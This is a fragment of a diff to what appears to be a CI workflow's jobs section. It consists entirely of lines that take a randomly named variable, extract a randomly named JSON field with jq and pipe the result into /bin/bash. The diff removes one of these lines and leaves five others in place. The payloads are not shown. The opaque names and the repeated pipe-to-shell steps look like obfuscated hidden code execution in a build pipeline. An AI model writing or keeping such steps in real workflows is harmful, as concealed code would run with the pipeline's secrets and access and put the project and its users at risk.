@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$wpdx212" | jq -r .yqude477 | /bin/bash
           echo $vqp0 | jq -r .xtc6323 | /bin/bash
           printf '%s' "$plxyy19574" | jq -r .khzvq946 | /bin/bash
-          printf '%s' "$bfiy1" | jq -r .wmf35 | /bin/bash
           echo $q46032 | jq -r .kptk6 | /bin/bash
           echo $akt7 | jq -r .io2053 | /bin/bash
 
